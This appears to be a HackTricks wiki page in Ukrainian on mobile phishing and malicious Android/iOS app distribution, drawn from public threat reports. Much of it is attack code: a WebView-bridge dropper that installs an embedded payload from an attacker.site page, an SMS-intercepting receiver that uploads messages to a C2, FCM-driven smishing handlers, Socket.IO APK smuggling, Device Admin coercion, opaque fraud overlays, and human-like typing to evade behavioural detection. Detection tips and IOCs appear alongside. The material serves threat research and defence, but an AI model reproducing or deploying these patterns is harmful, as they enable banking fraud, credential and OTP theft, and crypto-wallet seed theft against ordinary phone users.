# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ця сторінка охоплює техніки, які використовують threat actors для розповсюдження **malicious Android APKs** та **iOS mobile-configuration profiles** через phishing (SEO, social engineering, fake stores, dating apps тощо).
> Матеріал адаптовано з кампанії SarangTrap, викритої Zimperium zLabs (2025), та інших публічних досліджень.

## Потік атаки

1. SEO/Phishing Infrastructure
* Зареєструвати десятки доменів-підробок (dating, cloud share, car service…).
– Використовувати ключові слова рідною мовою та емоджі в елементі `<title>`, щоб підвищити рейтинг в Google.
– Розмістити інструкції для встановлення як для Android (`.apk`), так і для iOS на одній цільовій сторінці.
2. Початкове завантаження
* Android: пряма ссылка на *unsigned* або «third-party store» APK.
* iOS: `itms-services://` або звичайне HTTPS посилання на шкідливий **mobileconfig** профіль (див. нижче).
3. Соціальна інженерія після встановлення
* При першому запуску додаток просить **invitation / verification code** (ілюзія ексклюзивного доступу).
* Код відправляється методом **POST по HTTP** на Command-and-Control (C2).
* C2 відповідає `{"success":true}` ➜ шкідлива логіка продовжує роботу.
* Sandbox / AV динамічний аналіз, який ніколи не надсилає дійсний код, не бачить **шкідливої поведінки** (evation).
4. Зловживання дозволами під час виконання (Android)
* Небезпечні дозволи запитуються лише **після позитивної відповіді від C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Останні варіанти **видаляють `<uses-permission>` для SMS з `AndroidManifest.xml`**, але лишають Java/Kotlin код, що читає SMS через reflection ⇒ знижує статичну оцінку, але продовжує працювати на пристроях, які надають дозвіл через `AppOps` abuse або старі цілі.
5. Фасадний інтерфейс і фоновий збір даних
* Додаток показує нешкідливі вью (SMS viewer, gallery picker), реалізовані локально.
* Водночас ексфільтрує:
- IMEI / IMSI, номер телефону
- Повний дамп `ContactsContract` (JSON масив)
- JPEG/PNG з `/sdcard/DCIM`, стиснуті за допомогою [Luban](https://github.com/Curzibn/Luban) для зменшення розміру
- Необов’язково SMS-контент (`content://sms`)
Пейлоади **пакуються в батчі у zip** і відправляються через `HTTP POST /upload.php`.
6. Техніка доставки iOS
* Один **mobile-configuration profile** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб зареєструвати пристрій у підставній «MDM»-подібній супервізії.
* Інструкції соціальної інженерії:
1. Відкрийте Settings ➜ *Profile downloaded*.
2. Натисніть *Install* три рази (скріншоти на фішинговій сторінці).
3. Довірте unsigned profile ➜ attacker отримує *Contacts* & *Photo* entitlement без перевірки в App Store.
7. Мережевий рівень
* Plain HTTP, часто на порту 80 з HOST header на кшталт `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (немає TLS → легко помітити).

## Поради Red Team

* **Dynamic Analysis Bypass** – під час аналізу шкідливого ПЗ автоматизуйте фазу введення invitation code за допомогою Frida/Objection, щоб дістатися шкідливої гілки.
* **Manifest vs. Runtime Diff** – порівняйте `aapt dump permissions` з runtime `PackageManager#getRequestedPermissions()`; відсутність небезпечних дозволів — індикатор підозри.
* **Network Canary** – налаштуйте `iptables -p tcp --dport 80 -j NFQUEUE` для виявлення ненормальних POST-потоків після введення коду.
* **mobileconfig Inspection** – використовуйте `security cms -D -i profile.mobileconfig` на macOS, щоб перелічити `PayloadContent` і виявити надмірні entitlements.

## Корисний фрагмент Frida: автоматичний обхід коду запрошення

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Індикатори (загальні)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Цей патерн спостерігається в кампаніях, що зловживають темами державних виплат, щоб викрасти індійські UPI credentials та OTPs. Оператори ланцюжать авторитетні платформи для доставки та підвищення стійкості.

### Delivery chain across trusted platforms
- YouTube video lure → опис містить коротке посилання
- Shortlink → GitHub Pages phishing site, що імітує справжній портал
- Той самий GitHub repo розміщує APK з фальшивим бейджем “Google Play”, що веде безпосередньо до файлу
- Динамічні phishing pages живуть на Replit; канал віддалених команд використовує Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Перший APK — installer (dropper), який доставляє реальний malware у `assets/app.apk` і підказує користувачу вимкнути Wi‑Fi/mobile data, щоб знизити ефективність cloud detection.
- Вбудований payload встановлюється під нешкідливою назвою (наприклад, “Secure Update”). Після встановлення і installer, і payload присутні як окремі додатки.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Динамічне виявлення endpoint через shortlink
- Malware отримує зі shortlink список у plain-text, розділений комами, живих endpoints; прості перетворення рядків формують кінцевий шлях до phishing page.

Приклад (санітизований):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Псевдокод:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Збір облікових даних UPI через WebView
- Крок «Make payment of ₹1 / UPI‑Lite» завантажує HTML-форму зловмисника з динамічного endpoint всередині WebView і захоплює конфіденційні поля (телефон, банк, UPI PIN), які `POST`яться на `addup.php`.

Мінімальний лоадер:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Саморозповсюдження та SMS/OTP перехоплення
- При першому запуску запитуються агресивні дозволи:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Контакти циклічно використовуються для масової відправки smishing SMS з пристрою жертви.
- Вхідні SMS перехоплюються broadcast receiver і завантажуються з метаданими (sender, body, SIM slot, per-device random ID) на `/addsm.php`.

Схема receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) як стійкий C2
- payload реєструється в FCM; push messages несуть поле `_type`, яке використовується як перемикач для запуску дій (e.g., оновлювати phishing текстові шаблони, перемикати поведінки).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Ескіз Handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Індикатори/IOCs
- APK містить додатковий payload у `assets/app.apk`
- WebView завантажує платіж із `gate.htm` і ексфільтрує його на `/addup.php`
- Ексфільтрація SMS на `/addsm.php`
- Отримання конфігурації через короткі посилання (наприклад, `rebrand.ly/*`), що повертає CSV endpoints
- Додатки з позначенням “Update/Secure Update”
- FCM `data` повідомлення з дискримінатором `_type` у ненадійних додатках

---

## APK Smuggling на основі Socket.IO/WebSocket + підроблені сторінки Google Play

Зловмисники все частіше замінюють статичні посилання на APK каналом Socket.IO/WebSocket, вбудованим у підробні лендінги, що імітують Google Play. Це приховує payload URL, обходить фільтри URL/extension і зберігає реалістичний install UX.

Типовий клієнтський сценарій, зафіксований у реальних випадках:

<details>
<summary>Socket.IO підроблений Play-завантажувач (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Чому це обходить прості засоби контролю:
- Не розкривається статичний URL APK; payload відновлюється в пам'яті з кадрів WebSocket.
- Фільтри URL/MIME/розширень, які блокують прямі відповіді .apk, можуть не помітити двійкові дані, тунельовані через WebSockets/Socket.IO.
- Краулери та URL sandboxes, які не виконують WebSockets, не отримають payload.

Див. також WebSocket tradecraft і tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration — кейс RatOn

Кампанія RatOn banker/RAT (ThreatFabric) — конкретний приклад того, як сучасні мобільні phishing-операції поєднують WebView droppers, Accessibility-driven UI automation, overlays/ransom, примусове активування Device Admin, Automated Transfer System (ATS), takeover крипто-гаманців та навіть NFC-relay orchestration. Цей розділ виділяє повторно використовувані техніки.

### Stage-1: WebView → native install bridge (dropper)
Атакувальники показують WebView, що вказує на сторінку нападника, і інжектять JavaScript-інтерфейс, який відкриває доступ до нативного інсталятора. Торкання HTML-кнопки викликає нативний код, який встановлює APK другого етапу, упакований у assets dropper'а, а потім одразу його запускає.

Мінімальна схема:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML на сторінці:
```html
<button onclick="bridge.installApk()">Install</button>
```
Після встановлення dropper запускає payload через явний package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ідея для виявлення: недовірені додатки, що викликають `addJavascriptInterface()` і відкривають інсталятороподібні методи для WebView; APK, що містить вбудований вторинний payload у `assets/` і викликає Package Installer Session API.

### Канал згоди: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 відкриває WebView, який розміщує сторінку «Access». Її кнопка викликає експортований метод, що переводить жертву в налаштування Accessibility і просить увімкнути шкідливий сервіс. Після надання доступу malware використовує Accessibility, щоб автоматично натискати через наступні діалоги runtime permission (contacts, overlay, manage system settings, etc.) і запитує Device Admin.

- Accessibility програмно допомагає приймати подальші запити, знаходячи в node-tree кнопки типу «Allow»/«OK» і ініціюючи кліки.
- Перевірка/запит дозволу overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Див. також:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Фішинг/вимагання через оверлей у WebView
Оператори можуть відправляти команди для:
- відобразити оверлей на весь екран із URL, або
- передати вбудований HTML, який завантажується в оверлей WebView.

Ймовірне використання: примус (введення PIN), відкриття гаманця для перехоплення PIN, повідомлення про викуп. Майте команду, яка перевіряє та забезпечує наявність дозволу на оверлей, якщо його бракує.

### Модель віддаленого керування — текстовий псевдо-екран + трансляція екрана
- Low-bandwidth: періодично знімати дерево вузлів Accessibility, серіалізувати видимі тексти/ролі/межі і відправляти на C2 як псевдо-екран (команди типу `txt_screen` одноразово і `screen_live` для безперервної передачі).
- High-fidelity: запитувати MediaProjection і запускати трансляцію/запис екрана за запитом (команди типу `display` / `record`).

### ATS playbook (автоматизація банківського додатку)
Отримавши JSON task, відкрити bank app, керувати UI через Accessibility, використовуючи поєднання текстових запитів і натискань по координатах, та ввести платіжний PIN жертви коли буде запит.

Приклад задачі:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Приклади текстів, що зустрічаються в одному цільовому потоці (CZ → EN):
- "Nová platba" → "Нова оплата"
- "Zadat platbu" → "Ввести платіж"
- "Nový příjemce" → "Новий одержувач"
- "Domácí číslo účtu" → "Домашній номер рахунку"
- "Další" → "Далі"
- "Odeslat" → "Відправити"
- "Ano, pokračovat" → "Так, продовжити"
- "Zaplatit" → "Оплатити"
- "Hotovo" → "Готово"

Оператори також можуть перевіряти/підвищувати ліміти переказів за допомогою команд на кшталт `check_limit` та `limit`, які подібним чином взаємодіють з інтерфейсом лімітів.

### Crypto wallet seed extraction
Мішені, такі як MetaMask, Trust Wallet, Blockchain.com, Phantom. Потік: розблокувати (вкрадений PIN або наданий пароль), перейти в Security/Recovery, показати/відкрити seed-фразу, keylog/exfiltrate її. Реалізуйте селектори, що враховують локаль (EN/RU/CZ/SK), щоб стабілізувати навігацію між мовами.

### Device Admin coercion
Device Admin APIs використовуються для збільшення можливостей PIN-capture та утруднення дій жертви:

- Миттєве блокування:
```java
dpm.lockNow();
```
- Прострочити поточні облікові дані, щоб примусити зміну (Accessibility перехоплює новий PIN/пароль):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Примусове розблокування без біометрії шляхом відключення keyguard biometric features:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Примітка: Багато контролів DevicePolicyManager вимагають Device Owner/Profile Owner на сучасних Android; деякі OEM-збірки можуть бути менш суворими. Завжди перевіряйте на цільовій OS/OEM.

### Оркестрація NFC-реле (NFSkate)
Stage-3 може встановити та запустити зовнішній модуль NFC-relay (наприклад, NFSkate) і навіть передати йому HTML-шаблон, щоб керувати жертвою під час реле. Це дозволяє виконувати безконтактне card-present зняття готівки паралельно з онлайн ATS.

Джерело: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Набір команд оператора (приклад)
- UI/стан: `txt_screen`, `screen_live`, `display`, `record`
- Соціальні: `send_push`, `Facebook`, `WhatsApp`
- Накладки: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Гаманці: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Пристрій: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Комунікації/Розвідка: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-орієнтований обхід детекції ATS: людоподібна каденція введення та подвійна ін'єкція тексту (Herodotus)

Зловмисники все частіше поєднують автоматизацію через Accessibility з антидетекцією, налаштованою проти базової поведінкової біометрії. Нещодавній banker/RAT демонструє два взаємодоповнюючі режими доставки тексту та перемикач для оператора для імітації людського набору з рандомізованою каденцією.

- Режим виявлення: перераховує видимі вузли з селекторами та bounds, щоб точно націлити поля введення (ID, text, contentDescription, hint, bounds) перед дією.
- Подвійна ін'єкція тексту:
- Режим 1 – `ACTION_SET_TEXT` безпосередньо на цільовому вузлі (стабільно, без клавіатури);
- Режим 2 – встановлення clipboard + `ACTION_PASTE` у сфокусований вузол (працює коли direct setText заблоковано).
- Людоподібна каденція: розділяє рядок, наданий оператором, і доставляє його символ-за-символом з рандомізованими затримками 300–3000 ms між подіями, щоб уникнути евристик «машинного набору». Реалізується або шляхом поступового збільшення значення через `ACTION_SET_TEXT`, або вставкою по одному символу.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Блокуючі накладки для маскування шахрайства:
- Відтворюйте повноекранний `TYPE_ACCESSIBILITY_OVERLAY` з керованою оператором прозорістю; тримайте його непрозорим для жертви, поки під ним виконується віддалена автоматизація.
- Зазвичай доступні команди: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Мінімальна накладка з регульованою alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Часто зустрічаються примітиви керування оператором: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (спільний доступ до екрана).

## Посилання

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
